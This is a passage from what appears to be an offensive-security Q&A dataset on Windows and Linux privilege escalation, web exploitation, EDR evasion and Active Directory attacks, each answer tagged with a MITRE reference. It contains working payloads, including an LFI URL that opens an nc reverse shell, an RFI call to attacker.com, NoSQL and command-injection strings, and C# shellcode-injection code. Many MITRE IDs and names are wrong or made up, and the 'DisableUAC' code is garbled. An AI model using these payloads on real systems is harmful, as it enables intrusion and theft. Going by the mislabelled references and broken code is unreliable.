A: A common technique to bypass AppLocker restrictions on Windows is to use signed executables that are allowed by the policy. This can be done by finding a writable directory that is trusted by AppLocker and placing a malicious DLL file there. When a legitimate process loads the DLL, the malicious code will execute under the permissions of the trusted parent process, bypassing the AppLocker rules. MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can you use a modified version of the Get-bADpasswords PowerShell script to retrieve the Administrator's password hash?
A: To retrieve the Administrator's password hash using a modified Get-bADpasswords PowerShell script:1. Locate the Get-bADpasswords script on the target system.2. Modify the script to add a malicious payload that retrieves the Administrator's password hash.3. Sign the modified script using a certificate that is trusted by the system (e.g. a certificate found in the Recycle Bin).4. Execute the modified and signed script to retrieve the Administrator's password hash. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you use DLL hijacking to execute malicious code on a Windows system with AppLocker restrictions?
A: To use DLL hijacking to execute malicious code on a Windows system with AppLocker restrictions:1. Identify a legitimate process that is periodically executed on the system and loads a DLL file.2. Place a malicious DLL with the same name as the legitimate DLL in a directory that is writable by the user and allowed by AppLocker.3. When the legitimate process loads the malicious DLL, your malicious code will execute with the privileges of the parent process, bypassing AppLocker restrictions. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can file attributes be used to bypass permission restrictions and escalate privileges on a Linux system?
A: In addition to file permissions, Linux systems also use file attributes that can further restrict access to files. One useful attribute is the 'append-only' (a) attribute, which allows users to only append data to a file, not modify or delete it. If a file with this attribute is owned by a privileged user and executed by the system, an attacker may be able to append a malicious payload to the file, such as a reverse shell, and gain elevated access when the file is executed. In the challenge, the /usr/local/sbin/ssh-alert.sh script had the 'a' attribute set, allowing the attacker to append a reverse shell to the script and gain root-level access when the script was executed. MITRE References: MITRE ID is T1222.001, MITRE Name is: File and Directory Permissions Modification: Windows File and Directory Permissions Modification, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can an attacker use NoSQL injection to bypass OTP validation?
A: To bypass OTP validation using NoSQL injection, the attacker can send a request to the OTP validation endpoint with a payload like `{"email":"htb@graph.htb","code":{"$ne": null}}`. This payload will bypass the OTP check by checking if the code field is not equal to null, effectively allowing the attacker to bypass the OTP validation. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001, Initial Access.

## Q: Describe how an attacker can use a combination of XSS and CSRF to steal an administrator token.
A: To steal an administrator token using a combination of XSS and CSRF, the attacker can first find an XSS vulnerability in the application, such as a server-side template injection flaw. The attacker can then use this XSS vulnerability to inject a malicious script that will perform a CSRF attack to update another user's profile with the attacker's payload. The payload can include a request to the GraphQL API to retrieve the target user's administrator token, which can then be exfiltrated to the attacker's server. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001, Initial Access, TA0006, Credential Access.

## Q: Describe how an attacker can exploit a Use After Free vulnerability in a binary to gain root privileges.
A: To exploit a Use After Free vulnerability in a binary to gain root privileges, the attacker can first reverse engineer the binary to understand its functionality and identify the vulnerable code path. The attacker can then craft a payload that leverages the UAF vulnerability to overwrite the contents of a critical data structure, such as the `userinfo1` variable that contains a shell command. By carefully manipulating the heap, the attacker can redirect the control flow to execute the injected shell command with root privileges. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, Privilege Escalation, TA0005, Defense Evasion.

## Q: How can you use a Python Flask application to gain initial access on a Linux machine?
A: To gain initial access on a Linux machine through a vulnerable Python Flask application, you can follow these steps:1. Identify any open ports on the target machine using Nmap (nmap -p- -sV <target_ip>).2. Locate the Flask application running on an open port (e.g., port 5000) and enumerate its functionality.3. Attempt to find and exploit vulnerabilities in the Flask application, such as insecure session management or remote code execution (RCE) vulnerabilities in dependencies.4. Leverage RCE to execute a reverse shell payload and gain initial access on the target machine. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What is the process for exploiting a vulnerable node.js module to achieve remote code execution (RCE) on a Linux machine?
A: To exploit a vulnerable node.js module to achieve RCE on a Linux machine, you can follow these steps:1. Identify the vulnerable node.js module and its version number.2. Research the specific RCE vulnerability affecting the module version.3. Craft a malicious payload that can be executed by the vulnerable module.4. Trigger the vulnerability in the application to execute the payload and gain RCE.5. Use the RCE to execute a reverse shell and gain initial access on the target machine. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you leverage user-defined functions in MySQL to escalate privileges on a Linux machine?
A: To escalate privileges on a Linux machine by exploiting user-defined functions in MySQL, you can follow these steps:1. Identify that the MySQL daemon is running as the root user.2. Compile a malicious user-defined function (UDF) in C that can execute arbitrary commands.3. Transfer the compiled UDF to the target machine and load it into the MySQL server.4. Create a new UDF that calls the malicious function to execute commands as the root user.5. Execute the malicious UDF to gain root-level access on the target machine. MITRE References: MITRE ID is T1068, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use Chisel to pivot through a compromised Docker container and access an internal Gitea server?
A: Chisel can be used to pivot through a compromised Docker container and access an internal Gitea server. First, start a Chisel server on your local machine. Then, in the compromised container, upload the Chisel binary and execute it as a client to connect back to your local Chisel server. This will forward the Gitea server's port (e.g., 3000) to your local machine, allowing you to access the Gitea instance through your browser. You can then use the credentials found earlier to log in and download the dev01 user's SSH keys. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: TA0008, Lateral Movement.

## Q: How can you exploit a PHP file inclusion vulnerability in a Roundcube webmail instance?
A: To exploit a PHP file inclusion vulnerability in Roundcube, you can use the `_plugin_<name>` parameter to include a malicious PHP file. The key is to find a writable directory on the server where you can upload the malicious file. In the Seventeen machine, the old file management system allowed uploading files to a directory based on the student ID, so the malicious PHP file was uploaded to `files/31234/papers.php`. Then, the Roundcube exploit was used to include this file and gain a reverse shell. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007.

## Q: How can you leverage a local npm registry to escalate privileges on a Linux system?
A: If a local npm registry is discovered on a Linux system, you can attempt to leverage it for privilege escalation. First, create a malicious npm package and publish it to your own private registry. Then, modify the ~/.npmrc file to point to your private registry and execute a script that uses the malicious package, which will be installed with elevated privileges. In the Seventeen machine, the startup.sh script ran as root and used npm to install packages, so a malicious loglevel package was created and published to a local Verdaccio registry to gain a root shell. MITRE References: MITRE ID is T1072, MITRE Name is: Software Deployment Tools, and MITRE Tactics are: TA0004.

## Q: What is the process for exploiting a local file inclusion (LFI) vulnerability in a web application?
A: To exploit a local file inclusion (LFI) vulnerability in a web application:1. Identify parameters in the URL that may be vulnerable to file inclusion 2. Use PHP wrappers to read the source code of files (e.g. ?debug=php://filter/convert.base64-encode/resource=index.php)3. Decode the base64 output to view the source code contents4. Look for sensitive information like credentials or exposed functionality5. Attempt to abuse any identified weaknesses, such as remote file inclusion (RFI) via ?include=http://attacker.com/shell.php MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What is a silver ticket attack and how can it be used to gain access to a remote MSSQL service?
A: A silver ticket attack allows an attacker to forge a Kerberos ticket that can be used to impersonate any user, including the Administrator, on a specific service. The main steps are:
1. Obtain the NTLM hash of the target service account (e.g. MSSQL service account).
2. Determine the domain SID.
3. Use a tool like impacket-ticketer to generate a forged Kerberos ticket for the target service.
4. Use the forged ticket to access the remote MSSQL service as the impersonated user. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: CredentialAccess, Execution, Lateral Movement.

## Q: What is local file inclusion (LFI) and how can it be used to gain remote code execution?
A: Local file inclusion (LFI) is a vulnerability that allows an attacker to include files on the server through the web application. This can be used to read sensitive files, such as /etc/passwd, and potentially execute arbitrary code. In the case of the 'preprod-marketing.trick.htb' vhost, the LFI vulnerability can be exploited by sending a malicious email with PHP code that is then included using the ?page= parameter. For example: 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/mail/michael&cmd=nc%2010.10.14.29%201337%20-e%20/bin/sh'. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can you use the Zoiper VoIP client to access a voicemail system and retrieve credentials?
A: To access a voicemail system and retrieve credentials using the Zoiper VoIP client, follow these steps:

1. Download and install the Zoiper Classic VoIP client.
2. Configure a new account in Zoiper with the provided domain, username, and password.
3. Dial the voicemail access code (e.g., *62) to access the voicemail system.
4. Enter the voicemail password when prompted to listen to the messages.
5. The voicemail message may contain the credentials you need to access the system.

The Zoiper VoIP client is a useful tool for interacting with VoIP systems and retrieving potentially sensitive information, such as credentials, that may be left in voicemail messages. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can you exploit a container escape vulnerability like CVE-2022-0492 to break out of a Docker container and gain root access on the host?
A: To exploit a container escape vulnerability like CVE-2022-0492 to break out of a Docker container and gain root access on the host, you can use a publicly available PoC script. Here's an example:1. Download the PoC script for CVE-2022-0492 from a reputable source (e.g., GitHub).2. Modify the script to include a reverse shell payload that will connect back to your machine.3. Run the script on the target system, passing the reverse shell command as an argument.4. Catch the reverse shell on your machine, which will now have root privileges on the host.The CVE-2022-0492 vulnerability allows an attacker to escape from a Docker container by leveraging the cgroup release_agent feature. This PoC script demonstrates how to exploit this vulnerability to gain root access on the host system. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit the Cisco Smart Install vulnerability (CVE-2018-0171)?
A: The SIET (Smart Install Exploitation Tool) can be used to exploit the Cisco Smart Install vulnerability (CVE-2018-0171). The tool allows you to forcibly reboot the device, call RCE, and steal network equipment configurations. To use the tool, run: 'sudo python2 siet.py -g -i <target_ip>'. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: Explain how a penetration tester can use JAR file decompilation to analyze the internals of a Minecraft server plugin and potentially extract sensitive information.
A: Minecraft server plugins are often distributed as JAR files, which are Java archive files that can contain compiled Java bytecode, resources, and other assets. Penetration testers can use tools like JD-GUI (version 1.6.6) to decompile these JAR files and analyze the source code to identify potential vulnerabilities or discover sensitive information, such as hardcoded credentials or configuration details. This technique can be useful for enumerating the attack surface of a Minecraft server and identifying potential avenues for further exploitation. MITRE References: MITRE ID is T1006, MITRE Name is: Unix Command Injection, and MITRE Tactics are: Execution, Privilege Escalation.

## Q: How can you perform a local file inclusion (LFI) attack on a PHP web application using the mPDF library?
A: To perform an LFI attack on a PHP web application using the mPDF library, you can follow these steps:1. Identify the endpoint that uses the mPDF library to generate PDF files. This is often a download.php or similar file.2. Craft a payload that injects malicious content into the PDF file by leveraging the mPDF library's ability to include local files. For example, you can use the following payload:<html><body> <annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" /></body></html>3. Encode the payload in the following order: URL encode > URL encode > Base64 encode.4. Intercept the HTTP request that generates the PDF file and replace the PDF parameter with the encoded payload.5. Download the modified PDF file and inspect the attachments to see the contents of the included file (e.g., /etc/passwd). MITRE References: MITRE ID is CVE-2016-6196, MITRE Name is: Inclusion of Functionality from Untrusted Control Sphere, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you escalate privileges from a low-level user to a higher-privileged user by exploiting a vulnerable npm package?
A: To escalate privileges from a low-level user to a higher-privileged user by exploiting a vulnerable npm package, you can follow these steps:1. Identify a package that the low-level user is allowed to run as a higher-privileged user (e.g., using the `sudo -l` command).2. Research known vulnerabilities in the identified package. In this case, the package is `meta-git` version 1.1.2, which is vulnerable to remote code execution.3. Craft a payload that exploits the vulnerability in the `meta-git` package to execute arbitrary commands as the higher-privileged user. For example:`sudo -u developer /usr/local/bin/meta-git clone "ss || touch /tmp/hack.txt"`4. Execute the crafted payload to create a file owned by the higher-privileged user (in this case, `developer`), confirming the successful privilege escalation.5. Leverage the access to the higher-privileged user to further escalate privileges to root, if possible. MITRE References: MITRE ID is CVE-2019-18846, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004, Privilege Escalation.

## Q: How can you use the GDB debugger to inject a bind shell payload into a running process with the CAP_SYS_PTRACE capability to gain root privileges?
A: To use GDB to inject a bind shell payload into a running process with the CAP_SYS_PTRACE capability to gain root privileges, you can follow these steps:1. Identify a stable process running as root (e.g., the nginx process) by running `ps auxwww`.2. Craft a GDB script to inject the shellcode into the memory of the target process. You can obtain a bind shell payload for port 5600 and divide it into groups of 8 bytes (each being a long unsigned integer on a 64-bit machine).3. Attach GDB to the target process using its PID and execute the GDB script to inject the shellcode:`gdb -p 930 -x ./script.gdb &`4. Verify that the bind shell is listening on port 5600 by running `netstat -tuln`.5. Connect to the bind shell using `nc localhost 5600` to obtain a root shell. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, Privilege Escalation.

## Q: Explain how XML External Entity (XXE) Injection works and how it can be used to read sensitive files on the server.
A: XML External Entity (XXE) Injection is a vulnerability that occurs when an XML parser is configured to process external entity references in XML input. An attacker can exploit this by crafting a malicious XML document that references an external entity, which the XML parser will then attempt to retrieve. This can allow the attacker to read sensitive files on the server, such as the SSH private key for the root user. To exploit XXE, an attacker can include a malicious DOCTYPE declaration in the XML document that references a file on the server, and then have the application parse the malicious XML. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can a binary be reverse engineered to extract sensitive information?
A: Reverse engineering a binary can be used to extract sensitive information like passwords, API keys, or other secrets. Tools like Ghidra can be used to analyze the disassembled code and identify areas where sensitive data is stored in memory. For example, in a Golang binary, sensitive values are often stored in global data segments that can be identified and extracted. The extracted information can then be used to authenticate to services or further compromise the system. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Exfiltration.

## Q: How can you perform a Resource Based Constrained Delegation (RBCD) attack to escalate privileges in an active directory environment?
A: To perform a RBCD attack, you need a shell or code execution as a domain user that belongs to the Authenticated Users group. You can then use PowerShell commands to create a fake computer account, configure RBCD on the domain controller, and use Rubeus to request Kerberos tickets to impersonate the Administrator account. The key steps are:1. Use New-MachineAccount from PowerMad to create a fake computer account called FAKE-COMP01 with password 'Password123'. 2. Use Set-ADComputer to configure RBCD and allow FAKE-COMP01 to act on behalf of the domain controller.3. Use Rubeus s4u attack to request Kerberos tickets to impersonate the Administrator account.4. Use the obtained tickets with tools like Impacket's psexec.py to get a system shell as the Administrator. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you use SMB shares to discover and obtain potentially sensitive files on a Windows machine?
A: To discover and obtain sensitive files via SMB shares, you can:1. Use smbclient to list available SMB shares on the target machine.2. Attempt to connect anonymously to any non-default shares that seem interesting, like 'support-tools'.3. Once connected, list the files in the share and download any files that seem suspicious or out of the ordinary, like 'UserInfo.exe.zip'.4. Analyze the downloaded files using tools like ILSpy, Wine, or network captures to identify sensitive information like credentials that may be used to further compromise the system. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can you exploit vulnerabilities in an OPC UA server?
A: If authentication bypass vulnerabilities are found, you can configure an OPC UA client accordingly and see what you can access. This may allow anything from merely reading process values to actually operating heavy-duty industrial equipment. To get a clue of the device you have access to, read the 'ServerStatus' node values in the address space and google for a usage manual. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Initial Access, Privilege Escalation, Lateral Movement.

## Q: How can you bypass file upload restrictions to achieve remote code execution?
A: To bypass file upload restrictions, you can try techniques like using a file with a double extension (e.g., shell.php.pdf), modifying the MIME type in the request, or appending arbitrary data to the beginning of the file to bypass magic byte checks. You can also use Ffuf to brute-force the location of the uploaded file. Once you've successfully uploaded a malicious file, you can execute commands on the remote system by accessing the file's URL. MITRE References: MITRE ID is ATTACK-ID-001, MITRE Name is: Arbitrary File Upload, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can you leverage WordPress plugin vulnerabilities to gain further access on a system?
A: To leverage WordPress plugin vulnerabilities, you can search for known vulnerabilities in the installed plugins and attempt to exploit them. For example, the brandfolder plugin had a Local File Inclusion vulnerability that allowed you to load arbitrary PHP files. You can use this to execute commands on the remote system. Additionally, you can check the WordPress database for any stored credentials or encryption keys that can be used to gain further access. MITRE References: MITRE ID is ATTACK-ID-002, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Lateral Movement, Privilege Escalation.

## Q: How can you crack encrypted data and passwords stored in a WordPress database?
A: To crack encrypted data and passwords stored in a WordPress database, you can first find the encryption algorithm and key used by the application. In this case, the passwords-manager plugin used AES-256-CBC encryption and stored the encryption key in the WordPress options table. You can then use the encryption key and algorithm to decrypt the stored data, which in this case included an SSH key for the user 'john'. MITRE References: MITRE ID is ATTACK-ID-003, MITRE Name is: Credential Access, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can you leverage Virtual Machine and disk encryption vulnerabilities to escalate privileges?
A: To leverage Virtual Machine and disk encryption vulnerabilities, you can first obtain the encrypted disk image and its associated configuration file. In this case, the .vdi file was LUKS encrypted, and the .vbox file contained the encryption key. You can use tools like pyvboxdie-cracker to crack the password for the .vdi file, and then use a script to brute-force the LUKS password. Once you have access to the decrypted file system, you can search for any sensitive information, scripts, or credentials that can be used to escalate privileges. MITRE References: MITRE ID is ATTACK-ID-004, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can an attacker exploit an SQL injection vulnerability in a Gogs instance running on localhost?
A: To exploit an SQL injection vulnerability in a Gogs instance running on localhost, an attacker can follow these steps:1. Download and set up a local instance of Gogs version 0.5.5.1010 Beta, which is vulnerable to the SQL injection.2. Use SQLmap with a custom tamper script to bypass any filters and identify the injection point in the /api/v1/users/search?q= endpoint.3. Craft a payload to extract the username, hashed password, salt, and rands values from the users table.4. Apply the same payload on the remote Gogs instance to retrieve the credentials for the user 'susanne'.5. Crack the password hash using Hashcat and the PBKDF2 + HMAC + SHA256 algorithm. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001, Initial Access.

## Q: What is the purpose of the easy_install Python module, and how can it be abused to gain root privileges?
A: The easy_install Python module is used to install Python packages and libraries. However, if the module is run with elevated (sudo) privileges, it can be abused to maintain persistence and escalate privileges. By creating a malicious Python script and 'installing' it using easy_install, the elevated privileges are not dropped, allowing the attacker to maintain access as the root user. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: How can NoSQL injection be used to extract user password hashes from the Shoppy web application?
A: The Shoppy web application is vulnerable to NoSQL injection, which can be exploited to extract the password hashes for all users in the database. This can be done by injecting a specially crafted payload, such as "'; return '' == '" into the search functionality, which will bypass the normal query and return all user data, including the password hashes. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007.

## Q: Describe the process of reversing the password manager binary to obtain the credentials for the deploy user.
A: The password manager binary can be reverse engineered using a tool like Ghidra to analyze its source code and functionality. By examining the decompiled code, it is possible to identify the hardcoded master password "Sample" that is used to decrypt the credentials for the deploy user. These credentials can then be used to log in as the deploy user. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: TA0004.

## Q: How can the privileges of the deploy user, who is a member of the docker group, be exploited to gain root access on the Shoppy machine?
A: The deploy user is a member of the docker group, which grants it the ability to run Docker containers with elevated privileges. By running a Docker container based on the Alpine Linux image and mounting the host's root filesystem to the container, it is possible to gain access to the root.txt flag located in the /root directory. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004.

## Q: How can the vulnerable Consul configuration be exploited to gain root privileges?
A: The Consul configuration file located at /etc/consul.d/consul.hcl enables script checks, which can be leveraged to execute arbitrary commands as the root user. By creating a custom configuration file in the writable /etc/consul.d/config.d/ directory and reloading the Consul service using the obtained token, a reverse shell can be executed to gain root privileges on the system. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: Execution, Privilege Escalation.

## Q: What tool can be used to brute-force the intercepted TACACS authentication key?
A: Loki can be used to brute force the TACACS authentication key, usually in MD5 encrypted format. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can an attacker decrypt the TACACS-encrypted traffic after successfully brute-forcing the authentication key?
A: Once the key is successfully cracked, Wireshark can be used to decrypt the TACACS-encrypted traffic by providing the cracked key. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Credential Access.

## Q: What technique is used to bypass the security rule blocking WMI Process Call Create?
A: The example demonstrates that the security rule blocking WMI Process Call Create can be bypassed by using VBScript payloads via an event subscription. This technique involves generating a payload using a tool like GadgetToJScript, creating an event filter and consumer on the remote system, and then waiting for the event to trigger the execution of the VBScript payload. MITRE References: MITRE ID is T1047, MITRE Name is: Windows Management Instrumentation, and MITRE Tactics are: Execution, Lateral Movement.

## Q: What is the process for unhooking IAT and inline hooks used by EDRs to monitor system integrity?
A: Both IAT and inline hooks can be effectively "unhooked" by patching over them to restore their original values. Since this is all happening in userland of a process we control, we're relatively free to do that. In the case of inline hooking, we can even reload entire modules from disk (e.g. kernel32.dll, ntdll.dll etc) which would map an entirely fresh copy into memory, erasing the hooks. However, one significant downside is that EDRs do monitor the integrity of their own hooks, so even if we unhook them, the EDR can simply re-hook them at a later date and raise an alert that hook tampering was detected. A better strategy is to find different ways of executing the desired APIs, without ever touching the hooks. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: What are some examples of Malleable C2 profiles that can be used to control Beacon's network artifacts?
A: Raphael has provided several example Malleable C2 profiles, including the 'webbug.profile' which can be used to explain the different directives. The 'webbug.profile' demonstrates how to customize the HTTP GET and POST requests, including the URI, parameters, metadata, headers, and response body. MITRE References: MITRE ID is T1008, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: Lateral Movement.

## Q: How can you use P/Invoke to bypass Windows security controls, such as User Account Control (UAC) or Data Execution Prevention (DEP)?
A: While P/Invoke can be used to interact with low-level Windows APIs, it's important to note that using these capabilities to bypass security controls may be considered unethical or illegal in certain contexts. However, understanding how these techniques work can be valuable for security research, penetration testing, and developing defensive measures.One example of using P/Invoke to bypass security controls is disabling User Account Control (UAC) by calling the `ShellExecute` API function with the `runas` verb. This can be done using the following C# code:```csharp[DllImport("shell32.dll", SetLastError = true, CharSet = CharSet.Auto)]static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);static void DisableUAC() {    ShellExecute(IntPtr.Zero, "runas", "cmd.exe", "/c REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Disable_UAC /t REG_SZ /d \"C:\Windows\System32\reg.exe add HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Disable_UAC /t REG_SZ /d \"C:\Windows\\System32\\reg.exe add HKU\\S-1-5-20\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Disable_UAC /t REG_SZ /d \" /f", "", 1);}```This code adds a registry key that disables UAC, effectively elevating the application's privileges without user interaction.Similarly, you can use P/Invoke to bypass Data Execution Prevention (DEP) by calling the `VirtualProtect` API function to mark memory regions as executable. However, this type of technique should be used with caution and only in authorized security testing scenarios, as it can enable the execution of malicious code. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use P/Invoke to perform process injection and code execution on a target system?
A: While process injection and code execution using P/Invoke can be powerful, these techniques should only be used in authorized security testing scenarios, as they can enable the execution of malicious code.One example of using P/Invoke for process injection is to create a remote thread in a target process. This can be achieved using the following C# code:```csharp[DllImport("kernel32.dll")]static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);[DllImport("kernel32.dll")]static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);[DllImport("kernel32.dll")]static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);static void InjectCode(int processId, byte[] shellcode) {    using (var process = OpenProcess(0x001F0FFF, false, processId)) {        var address = VirtualAllocEx(process, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);        WriteProcessMemory(process, address, shellcode, (uint)shellcode.Length, out _);        CreateRemoteThread(process, IntPtr.Zero, 0, address, IntPtr.Zero, 0, out _);    }}```This code opens a handle to the target process, allocates memory in the target process, writes the shellcode to the allocated memory, and then creates a remote thread to execute the injected code.Again, it's important to emphasize that this type of functionality should only be used in authorized security testing scenarios, as it can be abused for malicious purposes. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you use the Nt*Section APIs to execute shellcode in a target process?
A: 1. Fetch the shellcode and create a new section within the current process, making it as large as the shellcode size.
2. Map the view of that section into the memory of the current process as RW.
3. Copy the shellcode into the mapped memory region.
4. Get a handle to the target process and map the same section into it, now as RX.
5. Create a new remote thread in the target process to execute the shellcode. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: What are some alternative techniques that can be used with the Nt*Section APIs for process injection?
A: You can mix and match the Nt*Section APIs with other techniques like spawning a process in a suspended state and using QueueUserAPC or NtQueueApcThread to execute the injected shellcode. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can Sublime Text plugins be used for persistence and WDAC bypass?
A: Sublime Text is a popular text editor that comes packaged with a Python interpreter and supports plugins written in Python. These plugins can be dropped into the user's %AppData% directory and used for persistence. Additionally, the core components of Sublime Text are signed by their Code Signing CA, which can be used to build a WDAC policy. However, the unsigned DLLs will not be permitted to load, which can be used to bypass WDAC by leveraging fallback rules. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can Python code be executed through Sublime Text plugins to run arbitrary commands or shellcode on a system?
A: Sublime Text plugins can be used to execute arbitrary Python code, which can then be used to run system commands or inject shellcode. For example, a plugin could be created that downloads and executes a remote beacon binary, allowing an attacker to gain remote access to the system. This can be done by leveraging the Python ctypes module to allocate memory, copy the shellcode, and execute it. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can certificates be leveraged for privilege escalation and maintaining persistent access in Active Directory?
A: Certificates can be used for privilege escalation and maintaining persistent access in Active Directory. They can be used to request Kerberos tickets that provide access even if a userâ€™s password changes. To find certificates that allow client authentication, use the Certify tool (v2.3.2) with the â€œfind /clientauthâ€ command. This will show all certificate templates in the CA that have the appropriate extended key usage (EKU) for client authentication. You can then request a certificate from a suitable template using â€œrequest /ca:ca-name /template:template-nameâ€. This will give you a private key and certificate that can be used to request a Kerberos ticket for the user account. Certificates can also be used to maintain persistent access to computers by requesting a certificate from the â€œMachineâ€ template, which does not require authorization and is valid for 1 year. MITRE References: MITRE ID is T1556.003, MITRE Name is: Subvert Trust Controls: Create or Modify Service Accounts, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: How can you create a malicious service binary to abuse an unquoted service path vulnerability?
A: In Cobalt Strike, you can create a malicious service binary by going to `Attacks > Packages > Windows Executable (S)` and selecting the `Service Binary` output type. This will generate a payload that can be deployed to the vulnerable service path. You should use a TCP beacon bound to localhost for privilege escalations to reduce the risk of detection. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: TA0004, Privilege Escalation.

## Q: How can you prepare a Word document with a malicious macro for delivery?
A: To prepare a Word document with a malicious macro for delivery, you can follow these steps:1. Create the macro using the 'AutoOpen' function to execute the malicious code automatically when the document is opened.2. Go to 'File > Info > Inspect Document > Inspect Document' and remove all 'Document Properties and Personal Information' to prevent the username on your system from being embedded in the document.3. Save the document as a Word 97-2003 (.doc) file format, as this allows you to embed macros, unlike the .docx format.4. When the target opens the document and clicks 'Enable Content', the malicious macro will execute, potentially giving the attacker access to the target's system. MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: Execution.

## Q: What is the purpose of the 'Document Inspector' feature in Word, and how can it be used to prepare a malicious document for delivery?
A: The 'Document Inspector' feature in Word can be used to remove metadata and personal information from a document before delivering it. Specifically, when preparing a malicious Word document with a macro, you can use the 'Document Inspector' to remove the 'Document Properties and Personal Information', which may include the username of the system where the document was created. This helps prevent the target from identifying the origin of the document, making the attack more stealthy. MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: Execution.

## Q: How can you leverage a misconfigured shell script to escalate privileges on a Linux system?
